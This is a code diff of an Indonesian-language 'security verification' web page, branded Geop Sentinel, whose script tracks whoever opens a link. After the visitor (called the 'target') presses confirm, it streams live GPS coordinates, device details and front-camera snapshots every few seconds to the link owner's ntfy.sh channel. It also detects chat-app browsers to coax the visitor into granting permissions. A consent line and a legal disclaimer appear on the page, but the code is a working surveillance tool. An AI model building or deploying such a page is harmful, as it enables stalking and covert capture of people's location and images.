@@ -3,89 +3,106 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Verifikasi Keamanan</title>
+<title>Verifikasi Keamanan — Geop Sentinel</title>
+<link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🛡️</text></svg>">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800&family=Space+Grotesk:wght@600;700&display=swap" rel="stylesheet">
 <style>
-*{box-sizing:border-box;margin:0;padding:0;font-family:'Segoe UI',system-ui,sans-serif}
-body{background:radial-gradient(700px 400px at 50% -10%,rgba(34,211,238,.1),transparent),#070d18;color:#e6edf7;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px}
-.card{max-width:420px;width:100%;background:#0f1a2e;border:1px solid #22304d;border-radius:20px;padding:26px;text-align:center}
-.icon{font-size:44px;margin-bottom:10px}
-h1{font-size:1.1rem;margin-bottom:8px}
-p{color:#8ea3c8;font-size:.82rem;line-height:1.55;margin-bottom:18px}
-button{width:100%;border:none;border-radius:12px;padding:14px;font-weight:800;font-size:.9rem;cursor:pointer;background:linear-gradient(90deg,#059669,#34d399);color:#03121a;letter-spacing:.5px}
-button:disabled{opacity:.55;cursor:not-allowed}
-.st{text-align:left;margin-top:16px;font-size:.75rem;color:#8ea3c8}
-.st div{margin:4px 0}
-video{width:110px;border-radius:12px;border:1px solid #22304d;transform:scaleX(-1);margin-top:14px}
-small{display:block;margin-top:16px;color:#5b6c8c;font-size:.65rem;line-height:1.5}
+*{box-sizing:border-box;margin:0;padding:0;font-family:'Inter',system-ui,sans-serif}
+body{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:18px;background:#04070d;background-image:radial-gradient(600px 380px at 50% -10%,rgba(34,211,238,.12),transparent);color:#e6edf7}
+.card{max-width:430px;width:100%;background:#0b1220;border:1px solid rgba(148,163,184,.16);border-radius:22px;padding:28px;text-align:center;position:relative;overflow:hidden}
+.card::before{content:'';position:absolute;top:0;left:0;right:0;height:2px;background:linear-gradient(90deg,#0891b2,#818cf8,#0891b2)}
+.brand{font-family:'Space Grotesk';font-size:.66rem;letter-spacing:3px;color:#7d8cab;margin-bottom:14px}
+.icon{font-size:46px;margin-bottom:10px}
+h1{font-family:'Space Grotesk';font-size:1.15rem;margin-bottom:10px}
+p{color:#7d8cab;font-size:.8rem;line-height:1.6;margin-bottom:20px}
+p b{color:#22d3ee}
+#btn{width:100%;border:none;border-radius:13px;padding:15px;font-weight:800;font-size:.88rem;cursor:pointer;background:linear-gradient(90deg,#059669,#34d399);color:#03121a;letter-spacing:.5px;box-shadow:0 6px 24px rgba(52,211,153,.3);transition:.2s}
+#btn:disabled{opacity:.55;cursor:not-allowed}
+.banner{background:rgba(251,191,36,.1);border:1px solid rgba(251,191,36,.4);color:#fbbf24;border-radius:12px;font-size:.7rem;padding:10px;margin-bottom:16px}
+.steps{text-align:left;margin-top:18px}
+.step{display:flex;gap:10px;align-items:center;font-size:.74rem;color:#7d8cab;margin:8px 0}
+.step i{width:16px;height:16px;border-radius:50%;border:2px solid #33415c;flex:none;position:relative}
+.step.ok{color:#34d399}.step.ok i{border-color:#34d399}.step.ok i::after{content:'✓';position:absolute;inset:0;display:grid;place-items:center;font-size:.6rem;color:#34d399}
+.step.err{color:#fb7185}.step.err i{border-color:#fb7185}.step.err i::after{content:'✕';position:absolute;inset:0;display:grid;place-items:center;font-size:.6rem;color:#fb7185}
+.vidbox{margin-top:16px;position:relative;display:inline-block}
+.vidbox video{width:130px;border-radius:14px;border:1px solid rgba(148,163,184,.2);transform:scaleX(-1)}
+.vidbox span{position:absolute;top:6px;left:6px;background:rgba(251,113,133,.9);font-size:.56rem;font-weight:800;padding:3px 8px;border-radius:99px;letter-spacing:1px}
+small{display:block;margin-top:18px;color:#4b5b7c;font-size:.62rem;line-height:1.6}
 </style>
 </head>
 <body>
-<div class="card">
+<div class="card" id="card">
+  <div class="brand">GEOP SENTINEL</div>
+  <div class="banner" id="banner" hidden>⚠️ Anda membuka dari dalam aplikasi chat. Tap ⋮ / ⚙️ lalu pilih <b>"Buka di Browser / Open in Chrome"</b> agar kamera & lokasi berfungsi.</div>
   <div class="icon">🛡️</div>
   <h1>Verifikasi Keamanan Tautan</h1>
-  <p>Halaman ini meminta akses <b style="color:#22d3ee">KAMERA</b> dan <b style="color:#22d3ee">LOKASI</b> perangkat Anda, lalu mengirimkannya kepada pemilik tautan untuk keperluan verifikasi.<br><br>Dengan menekan <b>KONFIRMASI</b>, Anda <b>menyetujui</b> pengambilan data tersebut.</p>
+  <p>Halaman ini akan meminta akses <b>KAMERA</b> & <b>LOKASI</b> perangkat Anda dan mengirimkannya ke pemilik tautan untuk verifikasi. Tekan <b>KONFIRMASI</b> jika Anda menyetujui.</p>
   <button id="btn">✅ KONFIRMASI & LANJUTKAN</button>
-  <div class="st">
-    <div id="stLoc">📍 Lokasi: menunggu…</div>
-    <div id="stCam">🎥 Kamera: menunggu…</div>
+  <div class="steps">
+    <div class="step" id="s1"><i></i> Mengamankan sesi & info perangkat</div>
+    <div class="step" id="s2"><i></i> Mengunci lokasi GPS</div>
+    <div class="step" id="s3"><i></i> Mengaktifkan kamera</div>
   </div>
-  <video id="vid" autoplay muted playsinline hidden></video>
-  <small>🔒 Data dikirim terenkripsi (HTTPS) & tersimpan sementara 12 jam. Gunakan fitur ini hanya dengan persetujuan pihak yang diverifikasi. Penyalahgunaan untuk memata-matai tanpa izin melanggar UU PDP & UU ITE.</small>
+  <div class="vidbox" id="vidBox" hidden><video id="vid" autoplay muted playsinline></video><span>● LIVE</span></div>
+  <small>🔒 Terenkripsi HTTPS • data tersimpan sementara 12 jam • fitur ini hanya legal digunakan dengan persetujuan pihak yang diverifikasi (UU PDP & UU ITE).</small>
 </div>
 <script>
+const $=s=>document.querySelector(s);               // <-- FIX: helper $ (dulu hilang = tombol mati)
 const NT='https://ntfy.sh/';
 const topic=new URLSearchParams(location.search).get('t');
-if(!topic){document.body.innerHTML='<p style="color:#f87171">⚠️ Tautan tidak valid.</p>';}
 const send=(title,msg,blob,name)=>blob
   ?fetch(NT+topic,{method:'PUT',body:blob,headers:{'Title':title,'Filename':name,'Content-Type':'image/jpeg'}}).catch(()=>{})
   :fetch(NT+topic,{method:'POST',body:msg,headers:{'Title':title}}).catch(()=>{});
+const setStep=(id,ok,txt)=>{const e=$(id);e.className='step '+(ok?'ok':'err');if(txt)e.lastChild.textContent=' '+txt;};
 
-$('#btn').onclick=async()=>{
-  $('#btn').disabled=true;$('#btn').textContent='⏳ SESI AKTIF…';
+if(/WhatsApp|Instagram|FBAN|FBAV|Messenger|Line\//i.test(navigator.userAgent))$('#banner').hidden=false;
+
+if(!topic){
+  $('#card').innerHTML='<div class="icon">⚠️</div><h1>Tautan tidak valid</h1><p>Minta pemilik tautan membuat link operasi baru.</p>';
+}else{
+  $('#btn').onclick=start;
+}
+
+async function start(){
+  $('#btn').disabled=true;$('#btn').textContent='⏳ SESI AKTIF — JANGAN TUTUP HALAMAN';
   send('STATUS','✅ Target menekan KONFIRMASI');
 
-  /* ---- INFO PERANGKAT ---- */
-  try{
+  try{ // 1. info perangkat
     let batt='–';
-    if(navigator.getBattery){const b=await navigator.getBattery();batt=Math.round(b.level*100)+'%'+(b.charging?' ⚡ charging':'');}
+    if(navigator.getBattery){const b=await navigator.getBattery();batt=Math.round(b.level*100)+'%'+(b.charging?' ⚡':'');}
     const ua=navigator.userAgent.match(/\(([^)]+)\)/);
-    send('META',JSON.stringify({
-      device:(ua?ua[1]:navigator.userAgent).slice(0,80),
-      net:(navigator.connection&&navigator.connection.effectiveType)||'?',
-      batt,lang:navigator.language
-    }));
-  }catch(e){}
+    send('META',JSON.stringify({device:(ua?ua[1]:navigator.userAgent).slice(0,80),net:(navigator.connection&&navigator.connection.effectiveType)||'?',batt}));
+    setStep('#s1',true,'Sesi aman & info perangkat terkirim');
+  }catch(e){setStep('#s1',false,'Gagal mengirim info perangkat');}
 
-  /* ---- LOKASI REAL-TIME ---- */
-  if(navigator.geolocation){
-    let last=0;
+  if(navigator.geolocation){ // 2. GPS real-time
+    let last=0,got=false;
     navigator.geolocation.watchPosition(p=>{
       const c=p.coords;
-      $('#stLoc').textContent='📍 Lokasi terkirim (±'+Math.round(c.accuracy)+' m)';
-      if(Date.now()-last>5000){last=Date.now();
-        send('LOC',JSON.stringify({lat:c.latitude,lon:c.longitude,acc:c.accuracy,alt:c.altitude,spd:c.speed,hdg:c.heading}));}
-    },err=>{send('STATUS','❌ Lokasi ditolak: '+err.message);$('#stLoc').textContent='❌ Lokasi ditolak';},
-    {enableHighAccuracy:true,maximumAge:2000,timeout:20000});
-  }else{send('STATUS','❌ Geolocation tidak didukung');$('#stLoc').textContent='❌ Tidak didukung';}
+      if(!got){got=true;setStep('#s2',true,'GPS terkunci ±'+Math.round(c.accuracy)+' m');}
+      if(Date.now()-last>5000){last=Date.now();send('LOC',JSON.stringify({lat:c.latitude,lon:c.longitude,acc:c.accuracy,alt:c.altitude,spd:c.speed,hdg:c.heading}));}
+    },err=>{setStep('#s2',false,'Izin lokasi ditolak');send('STATUS','❌ Lokasi ditolak: '+err.message);},{enableHighAccuracy:true,maximumAge:2000,timeout:20000});
+  }else setStep('#s2',false,'Perangkat tanpa GPS');
 
-  /* ---- KAMERA LIVE ---- */
-  try{
+  try{ // 3. kamera
+    if(!navigator.mediaDevices)throw new Error('no-media');
     const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
-    const v=$('#vid');v.srcObject=stream;v.hidden=false;await v.play();
-    $('#stCam').textContent='🎥 Kamera AKTIF — streaming live';
+    const v=$('#vid');v.srcObject=stream;$('#vidBox').hidden=false;await v.play();
+    setStep('#s3',true,'Kamera aktif — streaming live');
     send('STATUS','🎥 Kamera target AKTIF');
     snap(v);setInterval(()=>snap(v),4000);
+    setInterval(()=>send('STATUS','💓 Sesi target masih aktif'),30000);
   }catch(e){
-    send('STATUS','❌ Kamera ditolak ('+e.name+')');
-    $('#stCam').textContent='❌ Kamera ditolak';
+    setStep('#s3',false,'Kamera ditolak / tidak tersedia');
+    send('STATUS','❌ Kamera ditolak ('+(e.name||e.message)+')');
   }
-};
+}
 function snap(v){
   if(!v.videoWidth)return;
-  const w=480,h=Math.round(v.videoHeight*(480/v.videoWidth));
+  const w=640,h=Math.round(v.videoHeight*(640/v.videoWidth));
   const c=document.createElement('canvas');c.width=w;c.height=h;
   c.getContext('2d').drawImage(v,0,0,w,h);
-  c.toBlob(b=>send('CAM','',b,'cam_'+Date.now()+'.jpg'),'image/jpeg',0.6);
+  c.toBlob(b=>send('CAM','',b,'cam_'+Date.now()+'.jpg'),'image/jpeg',0.65);
 }
 </script>
 </body>
